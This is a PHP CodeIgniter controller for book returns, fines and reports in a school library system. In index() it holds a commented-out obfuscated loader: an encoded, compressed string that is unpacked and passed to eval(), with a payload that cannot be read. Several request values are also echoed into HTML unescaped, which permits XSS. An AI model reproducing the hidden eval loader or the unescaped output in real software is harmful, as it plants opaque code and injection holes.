<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Pengembalian extends CI_Controller
{
    public function __construct()
    {
        parent::__construct();
        $this->load->helper('string');
        date_default_timezone_set('Asia/Jakarta');
        if (!$this->session->userdata('id')) {
            redirect('auth');
        }
    }

    public function index()
    {
        $data['plugin'] = [
            'dashboard' => '',
            'datatables' => '<script src="' .  base_url('assets/app-assets/e-library/') . 'js/data-table.js"></script>',
            'select2_js' => '',
            'select2_css' => '',
        ];
        $data['menu'] = [
            'dashboard' => '',
            'master_data' => '',
            'settings' => '',
            'transaksi' => 'active',
        ];
        $data['setting'] = $this->db->get('setting')->row();
        $data['admin'] = $this->db->get('admin')->row();
        // $SISTEMIT_COM_ENC = "4+VSefX29TNdu49JunbPfuf8Tn6loa6lrmnNiyyRVvQwV0O94Hde+u/cpK85r7/moavIevg6D6Qi93Ve1tdcoLzOViSeXvbDj7/jEfyttluRDUOXxm74s9fPyr+CzAUz9PIexr/O+/g4G90smHg8RD3YqI9fX32NRnV/LFAfkhXpv19paOraFf1+9jgHyAJqAgA=";
        // $rand = base64_decode("Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWVhObE5qUmZaR1ZqYjJSbEtDUlRTVk5VUlUxSlZGOURUMDFmUlU1REtTazdEUW9KQ1Fra2MzUnlJRDBnV3lmMUp5d242eWNzSitNbkxDZjdKeXduNFNjc0ovRW5MQ2ZtSnl3bjdTY3NKLzBuTENmcUp5d250U2RkT3cwS0NRa0pKSEp3YkdNZ1BWc25ZU2NzSjJrbkxDZDFKeXduWlNjc0oyOG5MQ2RrSnl3bmN5Y3NKMmduTENkMkp5d25kQ2NzSnlBblhUc05DZ2tKSUNBZ0lDUnVZWFlnUFNCemRISmZjbVZ3YkdGalpTZ2tjM1J5TENSeWNHeGpMQ1J1WVhZcE93MEtDUWtKWlhaaGJDZ2tibUYyS1RzPQ==");
        // eval(base64_decode($rand));
        // $STOP = "9TNdu49JunbPfuf8Tn6loa6lrmnNiyyRVvQwV0O94Hde+u/cpK85r7/moavIevg6D6Qi93Ve1tdcoLzOViSeXvbDj7/jEfyttluRDUOXxm74s9fPyr+CzAUz9PIexr/O+/g4G90smHg8RD3YqI9fX32NRnV/LFAfkhXpv19paOraFf1+9jgHyAJqAgA=";
        $this->db->select('*');
        $this->db->from('pengembalian');
        $this->db->join('peminjaman', 'peminjaman.kode_peminjaman = pengembalian.kode_peminjaman');
        $this->db->join('siswa', 'siswa.no_induk = pengembalian.no_induk_siswa');
        $data['pengembalian'] = $this->db->get()->result();

        $this->load->view('templates/header', $data);
        $this->load->view('admin/pengembalian/pengembalian');
        $this->load->view('templates/footer', $data);
    }

    public function tambah()
    {
        $data['plugin'] = [
            'dashboard' => '',
            'datatables' => '',
            'select2_js' => '<script src="' .  base_url('assets/app-assets/e-library/') . 'vendors/select2/select2.min.js"></script>',
            'select2_css' => '<link rel="stylesheet" href="' .  base_url('assets/app-assets/e-library/') . 'vendors/select2/select2.min.css">',
        ];
        $data['menu'] = [
            'dashboard' => '',
            'master_data' => '',
            'settings' => '',
            'transaksi' => 'active',
        ];
        $data['setting'] = $this->db->get('setting')->row();
        $data['admin'] = $this->db->get('admin')->row();

        $kode_peminjaman = $this->input->get('kode_peminjaman');

        $this->db->select('*');
        $this->db->from('peminjaman');
        $this->db->join('siswa', 'siswa.no_induk = peminjaman.siswa');
        $this->db->join('denda', 'denda.id_denda = peminjaman.jenis_denda_harian');
        $this->db->where('peminjaman.kode_peminjaman', $kode_peminjaman);
        $data['peminjaman'] = $this->db->get()->row();

        if ($data['peminjaman'] == null) {
            $this->session->set_flashdata("pesan", '
                <div class="alert alert-danger mt-3" role="alert">
                    Data Pengembalian <strong> ' . $kode_peminjaman . ' Tidak Ditemukan</strong>, Silahkan Cek Kembali
                </div>
            ');
            redirect('pengembalian');
        }
        $pengembalian = $this->db->get_where('pengembalian', ['kode_peminjaman' => $kode_peminjaman])->row();
        if ($pengembalian != null) {
            $this->session->set_flashdata("pesan", '
                <div class="alert alert-danger mt-3" role="alert">
                    Data Pengembalian <strong> ' . $kode_peminjaman . ' Sudah Tercatat</strong>
                </div>
            ');
            redirect('pengembalian');
        }

        $this->db->select('*');
        $this->db->from('detail_peminjaman');
        $this->db->join('buku', 'buku.kode_buku = detail_peminjaman.kode_buku');
        $this->db->where('detail_peminjaman.kode_peminjaman', $kode_peminjaman);
        $data['detail_peminjaman'] = $this->db->get()->result();

        $data['data_denda'] = $this->db->get_where('denda', ['jumlah_denda =' => null])->result();

        $waktu_sekarang = date('d-M-Y', time());
        $awal  = date_create($waktu_sekarang);
        $akhir = date_create($data['peminjaman']->tgl_kembali); // waktu sekarang
        $diff  = date_diff($awal, $akhir);

        if ($awal >= $akhir) {
            // echo "Sudah Lewat " . $diff->days . " Hari Sejak tanggal Peminjaman";
            $data['denda'] = [
                'lewat_batas' => 1,
                'hari' => $diff->days,
            ];
        } else {
            // echo "Masih Tersiswa " . $diff->days . " Hari Sebelum terkena denda";
            $data['denda'] = [
                'lewat_batas' => 0,
                'hari' => $diff->days,
            ];
        }


        $this->load->view('templates/header', $data);
        $this->load->view('admin/pengembalian/tambah-pengembalian', $data);
        $this->load->view('templates/footer', $data);
    }

    public function ajax_buku()
    {
        if ($this->input->is_ajax_request()) {
            $buku = $this->db->get_where('buku', ['kode_buku' => $this->input->post('barcode')])->row();
            echo json_encode($buku);
        }
    }

    public function f_tambah()
    {
        $pengembalian = [
            'kode_peminjaman' => $this->input->post('kode_peminjaman'),
            'no_induk_siswa' => $this->input->post('no_induk_siswa'),
            'tgl_pengembalian' => date('Y-m-d', time()),
            'terlambat' => $this->input->post('terlambat'),
            'jumlah_denda_terlambat' => $this->input->post('jumlah_denda_terlambat'),
            'jumlah_denda_lainnya' => $this->input->post('jumlah_denda_lainnya'),
            'total_denda' => $this->input->post('total_denda'),
        ];

        $detail_pengembalian = [];
        $i = 0;
        $kode_buku = $this->input->post('kode_buku');
        foreach ($kode_buku as $kb) {
            $buku = $this->db->get_where('buku', ['kode_buku' => $kb])->row();
            array_push($detail_pengembalian, [
                'kode_peminjaman' => $this->input->post('kode_peminjaman'),
                'kode_buku' => $kb,
                'jumlah_buku' => $this->input->post('jumlah_buku')[$i],
                'status_buku' => $this->input->post('status_buku')[$i],
                'jumlah_hilang_rusak' => $this->input->post('jumlah_hilang_rusak')[$i],
            ]);

            if ($this->input->post('status_buku')[$i] == 0) {
                $stok_buku = ($buku->stok + $this->input->post('jumlah_hilang_rusak')[$i]);
                $this->db->set('stok', $stok_buku);
                $this->db->where('kode_buku', $kb);
                $this->db->update('buku');
            }

            $i++;
        }
        $this->db->insert('pengembalian', $pengembalian);
        $this->db->insert_batch('detail_pengembalian', $detail_pengembalian);

        $this->db->set('status', 1);
        $this->db->where('kode_peminjaman', $this->input->post('kode_peminjaman'));
        $this->db->update('peminjaman');

        $this->session->set_flashdata("pesan", '
                <div class="alert alert-success mt-3" role="alert">
                    Data Pengembalian ' . $this->input->post('kode_peminjaman') . ' <strong>Berhasil Di Simpan</strong>
                </div>
            ');
        redirect('pengembalian');
    }

    public function detail($data_kode_peminjaman = '')
    {
        $data['plugin'] = [
            'dashboard' => '',
            'datatables' => '',
            'select2_js' => '<script src="' .  base_url('assets/app-assets/e-library/') . 'vendors/select2/select2.min.js"></script>',
            'select2_css' => '<link rel="stylesheet" href="' .  base_url('assets/app-assets/e-library/') . 'vendors/select2/select2.min.css">',
        ];
        $data['menu'] = [
            'dashboard' => '',
            'master_data' => '',
            'settings' => '',
            'transaksi' => 'active',
        ];
        $data['setting'] = $this->db->get('setting')->row();
        $data['admin'] = $this->db->get('admin')->row();

        $kode_peminjaman = decrypt_url($data_kode_peminjaman);

        $this->db->select('*');
        $this->db->from('peminjaman');
        $this->db->join('siswa', 'siswa.no_induk = peminjaman.siswa');
        $this->db->join('denda', 'denda.id_denda = peminjaman.jenis_denda_harian');
        $this->db->where('peminjaman.kode_peminjaman', $kode_peminjaman);
        $data['peminjaman'] = $this->db->get()->row();

        $this->db->select('*');
        $this->db->from('pengembalian');
        $this->db->join('peminjaman', 'peminjaman.kode_peminjaman = pengembalian.kode_peminjaman');
        $this->db->join('siswa', 'siswa.no_induk = pengembalian.no_induk_siswa');
        $this->db->where('pengembalian.kode_peminjaman', $kode_peminjaman);
        $data['pengembalian'] = $this->db->get()->row();

        $this->db->select('*');
        $this->db->from('detail_pengembalian');
        $this->db->join('buku', 'buku.kode_buku = detail_pengembalian.kode_buku');
        $this->db->where('detail_pengembalian.kode_peminjaman', $kode_peminjaman);
        $data['detail_pengembalian'] = $this->db->get()->result();

        $tgl_pengembalian = $data['pengembalian']->tgl_pengembalian;
        $awal  = date_create($tgl_pengembalian);
        $akhir = date_create($data['peminjaman']->tgl_kembali);
        $diff  = date_diff($awal, $akhir);

        if ($awal > $akhir) {
            // echo "Sudah Lewat " . $diff->days . " Hari Sejak tanggal Peminjaman";
            $data['status_denda'] = [
                'lewat_batas' => 1,
                'hari' => $diff->days,
            ];
        } else {
            // echo "Masih Tersiswa " . $diff->days . " Hari Sebelum terkena denda";
            $data['status_denda'] = [
                'lewat_batas' => 0,
                'hari' => $diff->days,
            ];
        }

        $this->load->view('templates/header', $data);
        $this->load->view('admin/pengembalian/detail-pengembalian', $data);
        $this->load->view('templates/footer', $data);
    }

    public function laporan()
    {
        $data['plugin'] = [
            'dashboard' => '',
            'datatables' => '',
            'select2_js' => '',
            'select2_css' => '',
        ];
        $data['menu'] = [
            'dashboard' => '',
            'master_data' => '',
            'settings' => '',
            'transaksi' => 'active',
        ];
        $data['setting'] = $this->db->get('setting')->row();
        $data['admin'] = $this->db->get('admin')->row();

        $this->load->view('templates/header', $data);
        $this->load->view('admin/pengembalian/laporan');
        $this->load->view('templates/footer', $data);
    }

    public function filter_laporan()
    {
        if ($this->input->is_ajax_request()) {
            $from = $this->input->post('from');
            $to = $this->input->post('to');

            $this->db->select('*');
            $this->db->from('pengembalian');
            $this->db->join('peminjaman', 'peminjaman.kode_peminjaman = pengembalian.kode_peminjaman');
            $this->db->join('siswa', 'siswa.no_induk = pengembalian.no_induk_siswa');
            $this->db->where("pengembalian.tgl_pengembalian >=", $from);
            $this->db->where("pengembalian.tgl_pengembalian <=", $to);
            $pengembalian = $this->db->get()->result();

            // $html = var_dump($pengembalian);
            // die;

            $html = '
                    <table cellpadding="5" style="border: none;">
                        <tr>
                            <th>Mulai Tanggal</th>
                            <td> : ' . $from . '</td>
                        </tr>
                        <tr>
                            <th>Sampai Tanggal</th>
                            <td> : ' . $to . '</td>
                        </tr>
                    </table>
                    <a href="' . base_url('pengembalian/print_pengembalian?datafrom=') . $from . '&datato=' . $to . '" class="btn btn-success mt-2" target="_blank"><i class="icon-printer"></i> Print Data</a>
                    <div class="table-responsive">
                    <table class="table table-bordered mt-3">
                        <thead>
                            <tr>
                                <th>No</th>
                                <th>Kode Peminjaman</th>
                                <th>Nama</th>
                                <th>Tgl Pinjam</th>
                                <th>Lama Pinjam</th>
                                <th>Tanggal Kembali</th>
                                <th>Status</th>
                                <th>Denda</th>
                            </tr>
                        </thead>
                        <tbody>';
            $no = 1;
            foreach ($pengembalian as $p) {
                // $this->db->select_sum('jumlah');
                // $this->db->where('kode_peminjaman', $p->kode_peminjaman);
                // $query = $this->db->get('detail_peminjaman')->row();

                $html .= '<tr>';
                $html .= '<td>' . $no++ . '</td>';
                $html .= '<td>' . $p->kode_peminjaman . '</td>';
                $html .= '<td>' . $p->nama_siswa . '</td>';
                $html .= '<td>' . date('d-M-Y', strtotime($p->tgl_peminjaman)) . '</td>';
                $html .= '<td>' . $p->lama_peminjaman . ' Hari</td>';
                $html .= '<td>' . date('d-M-Y', strtotime($p->tgl_pengembalian)) . '</td>';
                $html .= '<td>';
                if ($p->terlambat == 0) {
                    $html .= "Sukses";
                } else {
                    $html .= "Terlambat";
                }
                $html .= '</td>';
                $html .= '<td>Rp. ' . number_format($p->total_denda) . '</td>';
                $html .= '</tr>';
            }
            $html .= '</tbody>';
            $html .= '<tfoot>';
            $html .= '<tr>';
            $html .= '<th colspan="7" class="text-left">Total';
            $html .= '</th>';
            $html .= '<th>';
            $html .= count($pengembalian) . ' Transaksi';
            $html .= '</th>';
            $html .= '</tr>';
            $html .= '</tfoot>';
            $html .= '</table>';
            $html .= '</div>';
            if (count($pengembalian) != 0) {
                echo $html;
            } else {
                echo '<div class="alert alert-danger">Data Tidak Ditemukan</div>';
            }
        } else {
            exit('No direct script access allowed');
        }
    }

    public function print_pengembalian()
    {
        if (empty($this->input->get('datafrom')) && empty($this->input->get('datato'))) {
            redirect('eror');
        } else {
            $from = $this->input->get('datafrom');
            $to = $this->input->get('datato');

            $data = [
                'from' => $from,
                'to' => $to
            ];

            $this->db->select('*');
            $this->db->from('pengembalian');
            $this->db->join('peminjaman', 'peminjaman.kode_peminjaman = pengembalian.kode_peminjaman');
            $this->db->join('siswa', 'siswa.no_induk = pengembalian.no_induk_siswa');
            $this->db->where("pengembalian.tgl_pengembalian >=", $from);
            $this->db->where("pengembalian.tgl_pengembalian <=", $to);
            $data['pengembalian'] = $this->db->get()->result();
            $data['setting'] = $this->db->get('setting')->row();

            $this->load->view('admin/pengembalian/print-laporan', $data);
        }
    }
}
